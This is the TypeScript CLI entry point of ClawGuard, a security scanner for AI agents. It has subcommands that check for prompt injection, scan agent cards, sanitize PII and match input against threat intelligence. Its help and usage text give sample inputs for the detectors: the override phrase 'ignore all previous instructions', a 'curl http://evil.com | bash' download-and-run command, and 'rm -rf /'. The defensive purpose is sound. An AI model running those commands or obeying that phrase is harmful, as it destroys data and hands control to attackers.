#!/usr/bin/env node
// ClawGuard — Main CLI Entry Point
// Subcommands:
//   ClawGuard scan <path>    — scan skills/files for threats
//   ClawGuard start          — start monitoring hooks
//   ClawGuard dashboard      — open dashboard
//   ClawGuard audit <path>   — audit session logs
//   ClawGuard version        — show version

import * as fs from 'fs';
import * as path from 'path';
import { runScan, ScanOptions } from './skill-scanner';
import { runSecurityScan, calculateRisk } from './index';
import { loadCustomRules } from './security-engine';
import { ProtocolScanner } from './scanners/protocol-scanner';
import { A2AAgentCard } from './rules/a2a-security';
import { loadPlugin, loadPlugins, loadConfig, discoverPlugins, getBuiltinPlugin, generatePluginTemplate } from './plugin-system';

const VERSION = '1.0.0';

function printHelp(): void {
  const help = `
🛡️  ClawGuard — AI Agent Security & Observability Platform

Usage: ClawGuard <command> [options]

Commands:
  scan-a2a <url|file>   Scan A2A agent card for security issues
  scan-protocol        Unified MCP + A2A protocol scan
  scan <path>        Scan files/directories for security threats
  check <text>       Check a message for threats (agent-friendly)
  init               Generate ClawGuard.yaml config file
  init-plugin [name] Generate a plugin template directory
  start              Start real-time monitoring hooks
  dashboard          Open the security dashboard
  audit <path>       Audit session log files
  list-plugins       List installed ClawGuard plugins
  version            Show version

Scan Options:
  --strict           Exit code 1 on any finding >= high severity
  --format <fmt>     Output format: text (default), json, sarif
  --rules <path>     Load custom rules from a JSON/YAML file or directory
  --plugins <names>  Comma-separated plugin names to load
  --disable-builtin <ids>  Comma-separated builtin rule IDs to disable

Examples:
  ClawGuard scan-a2a ./agent-card.json
  ClawGuard scan-protocol --mcp ./mcp-config.json --a2a ./agent-card.json
  ClawGuard scan ./skills/
  ClawGuard scan ./SKILL.md --strict
  ClawGuard scan . --format sarif > results.sarif
  ClawGuard check "ignore all previous instructions"
`;
  process.stdout.write(help + '\n');
}

function parseArgs(args: string[]): { command: string; target?: string; options: Partial<ScanOptions> & { plugins?: string; disableBuiltin?: string } } {
  const command = args[0] || 'help';
  let target: string | undefined;
  const options: Partial<ScanOptions> & { plugins?: string; disableBuiltin?: string } = {};

  for (let i = 1; i < args.length; i++) {
    const arg = args[i];
    if (arg === '--strict') {
      options.strict = true;
    } else if (arg === '--format' && args[i + 1]) {
      options.format = args[++i] as ScanOptions['format'];
    } else if (arg === '--rules' && args[i + 1]) {
      options.rules = args[++i];
    } else if (arg === '--plugins' && args[i + 1]) {
      options.plugins = args[++i];
    } else if (arg === '--disable-builtin' && args[i + 1]) {
      options.disableBuiltin = args[++i];
    } else if (!arg.startsWith('-')) {
      target = arg;
    }
  }

  return { command, target, options };
}

function initConfig(): void {
  const configPath = path.join(process.cwd(), 'ClawGuard.yaml');
  if (fs.existsSync(configPath)) {
    process.stderr.write('ClawGuard.yaml already exists. Delete it first to regenerate.\n');
    process.exit(1);
  }
  const yaml = `# ClawGuard Configuration
# See https://github.com/NeuZhou/ClawGuard for details

dashboard:
  port: 19790
  enabled: true

budget:
  dailyUsd: 50
  weeklyUsd: 200
  monthlyUsd: 500

alerts:
  costThresholds:
    - 0.8
    - 0.9
    - 1.0
  securityEscalate:
    - critical
    - high
  stuckTimeoutMs: 300000
  cooldownMs: 300000

security:
  enabledRules:
    - prompt-injection
    - data-leakage
    - anomaly-detection
    - compliance
    - file-protection
    - identity-protection
    - mcp-security
    - supply-chain
  customRulesDir: "~/.openclaw/ClawGuard/rules.d"

exporters:
  jsonl:
    enabled: true
  syslog:
    enabled: false
    host: "127.0.0.1"
    port: 514
  webhook:
    enabled: false
    url: ""
    secret: ""

retention:
  days: 30
  maxFileSizeMb: 50
`;
  fs.writeFileSync(configPath, yaml);
  process.stdout.write('✅ Created ClawGuard.yaml — edit to customize\n');
}

async function main(): Promise<void> {
  const args = process.argv.slice(2);
  const { command, target, options } = parseArgs(args);

  switch (command) {
    case 'scan':
      if (!target) {
        process.stderr.write('Error: scan requires a path argument\n');
        process.stderr.write('Usage: ClawGuard scan <path> [--strict] [--format json|sarif|text] [--rules <path>]\n');
        process.exit(2);
      }
      if (options.rules) {
        loadCustomRules(options.rules);
      }
      runScan(target, options);
      break;

    case 'check':
    case 'check-message': {
      // Agent-friendly: check a message string for threats
      const text = args.slice(1).join(' ');
      if (!text) {
        process.stderr.write('Usage: ClawGuard check "message text to analyze"\n');
        process.exit(2);
      }
      const findings = runSecurityScan(text, 'inbound', { session: 'cli', channel: 'cli', timestamp: Date.now(), recentMessages: [], recentFindings: [] } as any);
      const risk = calculateRisk(findings);
      if (findings.length === 0) {
        process.stdout.write(`✅ CLEAN (score: ${risk.score})\n`);
      } else {
        process.stdout.write(`${risk.icon} ${risk.verdict} (score: ${risk.score})\n`);
        for (const f of findings) {
          const icon = f.severity === 'critical' ? '🔴' : f.severity === 'high' ? '🟠' : f.severity === 'warning' ? '🟡' : '🔵';
          process.stdout.write(`  ${icon} [${f.severity.toUpperCase()}] ${f.ruleId}: ${f.description}\n`);
        }
        if (risk.attackChains.length > 0) {
          process.stdout.write(`  ⛓️ Attack chains: ${risk.attackChains.join(', ')}\n`);
        }
      }
      if (findings.some(f => f.severity === 'critical' || f.severity === 'high')) {
        process.exit(1);
      }
      break;
    }

    case 'init':
      initConfig();
      break;

    case 'init-plugin': {
      const pluginName = target || 'clawguard-rules-my-rules';
      const outDir = path.join(process.cwd(), pluginName);
      generatePluginTemplate(outDir, pluginName);
      process.stdout.write(`✅ Plugin template created at: ${outDir}\n`);
      process.stdout.write(`   cd ${pluginName} && npm install\n`);
      break;
    }

    case 'list-plugins': {
      const config = loadConfig();
      const discovered = discoverPlugins();
      process.stdout.write('\n🔌 ClawGuard Plugins\n\n');

      // Builtin
      const builtin = getBuiltinPlugin();
      process.stdout.write(`  📦 ${builtin.plugin.name} (${builtin.source}) — ${builtin.plugin.rules.length} rules\n`);

      // From config
      if (config?.plugins?.length) {
        process.stdout.write('\n  From config:\n');
        for (const name of config.plugins) {
          try {
            const p = loadPlugin(name);
            process.stdout.write(`  ✅ ${p.plugin.name}@${p.plugin.version} (${p.source}) — ${p.plugin.rules.length} rules\n`);
          } catch (err: any) {
            process.stdout.write(`  ❌ ${name}: ${err.message}\n`);
          }
        }
      }

      // Auto-discovered
      if (discovered.length > 0) {
        process.stdout.write('\n  Auto-discovered:\n');
        for (const name of discovered) {
          try {
            const p = loadPlugin(name);
            process.stdout.write(`  📦 ${p.plugin.name}@${p.plugin.version} — ${p.plugin.rules.length} rules\n`);
          } catch (err: any) {
            process.stdout.write(`  ❌ ${name}: ${err.message}\n`);
          }
        }
      }

      process.stdout.write('\n');
      break;
    }

    case 'version':
    case '--version':
    case '-v':
      process.stdout.write(`ClawGuard v${VERSION}\n`);
      break;

    case 'start':
      process.stdout.write('🛡️  Starting ClawGuard monitoring hooks...\n');
      process.stdout.write('   Use the OpenClaw hooks integration for real-time monitoring.\n');
      process.stdout.write('   See: https://github.com/NeuZhou/ClawGuard#hooks\n');
      break;

    case 'dashboard': {
      const dataIdx = args.indexOf('--data');
      const outIdx = args.indexOf('--output');
      if (dataIdx !== -1 && args[dataIdx + 1]) {
        const { loadDashboardData, writeDashboard } = require('./dashboard');
        const dataFile = args[dataIdx + 1];
        const outFile = outIdx !== -1 && args[outIdx + 1] ? args[outIdx + 1] : 'dashboard.html';
        try {
          const data = loadDashboardData(dataFile);
          writeDashboard(data, outFile);
          process.stdout.write(`🖥️  Dashboard generated: ${outFile}\n`);
        } catch (err: any) {
          process.stderr.write(`Error: ${err.message}\n`);
          process.exit(1);
        }
      } else {
        process.stdout.write('🖥️  Dashboard available at http://localhost:19790\n');
        process.stdout.write('   Generate static: ClawGuard dashboard --data audit.json --output dashboard.html\n');
      }
      break;
    }

    case 'audit':
      if (!target) {
        process.stderr.write('Error: audit requires a path argument\n');
        process.exit(2);
      }
      process.stdout.write(`📋 Auditing session logs at: ${target}\n`);
      process.stdout.write('   (Audit mode scans session logs for anomalies and policy violations)\n');
      runScan(target, { ...options, format: options.format || 'text' });
      break;

    case 'sanitize': {
      // Sanitize PII/credentials from text
      const text = args.slice(1).join(' ');
      if (!text) {
        process.stderr.write('Usage: ClawGuard sanitize "text containing PII or secrets"\n');
        process.exit(2);
      }
      const { sanitize: doSanitize } = require('./sanitizer');
      const result = doSanitize(text);
      if (result.piiCount === 0) {
        process.stdout.write(`✅ No PII or credentials detected\n`);
        process.stdout.write(text + '\n');
      } else {
        process.stdout.write(`🛡️ Sanitized ${result.piiCount} item(s):\n`);
        for (const r of result.replacements) {
          process.stdout.write(`  ${r.type}: ${r.original.slice(0, 8)}... → ${r.placeholder}\n`);
        }
        process.stdout.write(`\n${result.sanitized}\n`);
      }
      break;
    }

    case 'intent-check': {
      // Check intent vs action mismatch
      const intentIdx = args.indexOf('--intent');
      const actionIdx = args.indexOf('--action');
      if (intentIdx === -1 || actionIdx === -1) {
        process.stderr.write('Usage: ClawGuard intent-check --intent "I will read the file" --action "rm -rf /"\n');
        process.exit(2);
      }
      const intentText = args.slice(intentIdx + 1, actionIdx > intentIdx ? actionIdx : undefined).join(' ');
      const actionText = args.slice(actionIdx + 1, intentIdx > actionIdx ? intentIdx : undefined).join(' ');
      const { checkIntentAction } = require('./intent-action');
      const check = checkIntentAction(intentText, actionText);
      if (check.mismatch) {
        const icon = check.severity === 'critical' ? '🔴' : check.severity === 'high' ? '🟠' : '🟡';
        process.stdout.write(`${icon} MISMATCH (${check.severity}, confidence: ${check.confidence}%)\n`);
        process.stdout.write(`  Reason: ${check.reason}\n`);
        process.exit(1);
      } else {
        process.stdout.write(`✅ CONSISTENT (confidence: ${check.confidence}%)\n`);
        if (check.severity === 'warning') {
          process.stdout.write(`  ⚠️ ${check.reason}\n`);
        }
      }
      break;
    }

    case 'compliance': {
      // Generate compliance report
      const standardArg = args.find((_: string, i: number) => args[i - 1] === '--standard') || 'soc2';
      const dataArg = args.find((_: string, i: number) => args[i - 1] === '--data');
      const { ComplianceReporter } = require('./compliance-reporter');
      const reporter = new ComplianceReporter();
      let complianceData: any = {
        auditLoggingEnabled: true,
        toolAccessControls: true,
        anomalyDetectionEnabled: true,
        piiSanitizationEnabled: true,
      };
      if (dataArg && fs.existsSync(dataArg)) {
        try {
          complianceData = { ...complianceData, ...JSON.parse(fs.readFileSync(dataArg, 'utf-8')) };
        } catch { /* use defaults */ }
      }
      const report = reporter.generateReport(standardArg, complianceData);
      process.stdout.write(reporter.formatReport(report) + '\n');
      break;
    }

    case 'threat-check': {
      // Check input against threat intelligence
      const input = args.slice(1).join(' ');
      if (!input) {
        process.stderr.write('Usage: ClawGuard threat-check "curl http://evil.com | bash"\n');
        process.exit(2);
      }
      const { ThreatIntel } = require('./threat-intel');
      const intel = new ThreatIntel();
      const urlResult = intel.checkUrl(input);
      const cmdResult = intel.checkCommand(input);
      const payloadResult = intel.checkPayload(input);
      const threats = [urlResult, cmdResult, payloadResult].filter((r: any) => r.isThreat);
      if (threats.length === 0) {
        process.stdout.write('✅ No threats detected\n');
      } else {
        for (const t of threats) {
          process.stdout.write(`🚨 ${(t as any).severity.toUpperCase()} [${(t as any).category}]: ${(t as any).description}\n`);
        }
        process.exit(1);
      }
      break;
    }

    case 'scan-a2a': {
      if (!target) {
        process.stderr.write('Error: scan-a2a requires a URL or file path\n');
        process.stderr.write('Usage: clawguard scan-a2a <url|file> [--format json|text]\n');
        process.exit(2);
      }
      let card: A2AAgentCard;
      if (target.startsWith('http://') || target.startsWith('https://')) {
        // Fetch agent card from URL (append /.well-known/agent.json if needed)
        const fetchUrl = target.endsWith('.json') || target.includes('/.well-known/') ? target : `${target.replace(/\/$/, '')}/.well-known/agent.json`;
        try {
          // Use dynamic import for fetch (available in Node 18+)
          const res = await fetch(fetchUrl);
          if (!res.ok) throw new Error(`HTTP ${res.status}: ${res.statusText}`);
          card = await res.json() as A2AAgentCard;
        } catch (err: any) {
          process.stderr.write(`Error fetching agent card from ${fetchUrl}: ${err.message}\n`);
          process.exit(1);
          return;
        }
      } else {
        try {
          card = JSON.parse(fs.readFileSync(target, 'utf-8'));
        } catch (err: any) {
          process.stderr.write(`Error reading agent card: ${err.message}\n`);
          process.exit(1);
          return;
        }
      }
      const scanner = new ProtocolScanner();
      const result = scanner.scanA2AAgent(card);
      if (options.format === 'json') {
        process.stdout.write(JSON.stringify(result, null, 2) + '\n');
      } else {
        process.stdout.write(`\n🛡️  A2A Agent Card Scan\n`);
        process.stdout.write(`   Agent: ${card.name ?? 'unknown'}\n`);
        process.stdout.write(`   URL:   ${card.url ?? 'not specified'}\n\n`);
        if (result.findings.length === 0) {
          process.stdout.write('✅ No security issues found\n');
        } else {
          process.stdout.write(`Found ${result.summary.total} issue(s): ${result.summary.critical} critical, ${result.summary.high} high, ${result.summary.warning} warning, ${result.summary.info} info\n\n`);
          for (const f of result.findings) {
            const icon = f.severity === 'critical' ? '🔴' : f.severity === 'high' ? '🟠' : f.severity === 'warning' ? '🟡' : '🔵';
            process.stdout.write(`  ${icon} [${f.severity.toUpperCase()}] ${f.ruleId}: ${f.description}\n`);
            if (f.evidence) process.stdout.write(`    Evidence: ${f.evidence}\n`);
          }
        }
        if (options.strict && result.findings.some(f => f.severity === 'critical' || f.severity === 'high')) {
          process.exit(1);
        }
      }
      break;
    }

    case 'scan-protocol': {
      const mcpIdx = args.indexOf('--mcp');
      const a2aIdx = args.indexOf('--a2a');
      if (mcpIdx === -1 && a2aIdx === -1) {
        process.stderr.write('Usage: clawguard scan-protocol --mcp <config.json> --a2a <url|file>\n');
        process.exit(2);
      }
      const scanner = new ProtocolScanner();
      let mcpConfig = undefined;
      let a2aCard = undefined;

      if (mcpIdx !== -1 && args[mcpIdx + 1]) {
        try {
          mcpConfig = JSON.parse(fs.readFileSync(args[mcpIdx + 1], 'utf-8'));
        } catch (err: any) {
          process.stderr.write(`Error reading MCP config: ${err.message}\n`);
          process.exit(1);
        }
      }
      if (a2aIdx !== -1 && args[a2aIdx + 1]) {
        const a2aTarget = args[a2aIdx + 1];
        if (a2aTarget.startsWith('http://') || a2aTarget.startsWith('https://')) {
          const fetchUrl = a2aTarget.endsWith('.json') || a2aTarget.includes('/.well-known/') ? a2aTarget : `${a2aTarget.replace(/\/$/, '')}/.well-known/agent.json`;
          try {
            const res = await fetch(fetchUrl);
            if (!res.ok) throw new Error(`HTTP ${res.status}`);
            a2aCard = await res.json();
          } catch (err: any) {
            process.stderr.write(`Error fetching A2A card: ${err.message}\n`);
            process.exit(1);
          }
        } else {
          try {
            a2aCard = JSON.parse(fs.readFileSync(a2aTarget, 'utf-8'));
          } catch (err: any) {
            process.stderr.write(`Error reading A2A card: ${err.message}\n`);
            process.exit(1);
          }
        }
      }

      const result = scanner.scanBoth({ mcp: mcpConfig, a2a: a2aCard });
      if (options.format === 'json') {
        process.stdout.write(JSON.stringify(result, null, 2) + '\n');
      } else {
        process.stdout.write(`\n🛡️  Unified Protocol Scan\n`);
        if (result.mcpFindings) process.stdout.write(`   MCP findings: ${result.mcpFindings.length}\n`);
        if (result.a2aFindings) process.stdout.write(`   A2A findings: ${result.a2aFindings.length}\n`);
        process.stdout.write(`   Total: ${result.summary.total} (${result.summary.critical}C ${result.summary.high}H ${result.summary.warning}W ${result.summary.info}I)\n\n`);
        for (const f of result.findings) {
          const icon = f.severity === 'critical' ? '🔴' : f.severity === 'high' ? '🟠' : f.severity === 'warning' ? '🟡' : '🔵';
          process.stdout.write(`  ${icon} [${f.severity.toUpperCase()}] ${f.ruleId}: ${f.description}\n`);
          if (f.evidence) process.stdout.write(`    Evidence: ${f.evidence}\n`);
        }
        if (result.findings.length === 0) process.stdout.write('✅ No security issues found\n');
      }
      if (options.strict && result.findings.some(f => f.severity === 'critical' || f.severity === 'high')) {
        process.exit(1);
      }
      break;
    }

    case 'help':
    case '--help':
    case '-h':
    default:
      printHelp();
      break;
  }
}

main().catch(err => { process.stderr.write(`Error: ${err.message}\n`); process.exit(1); });

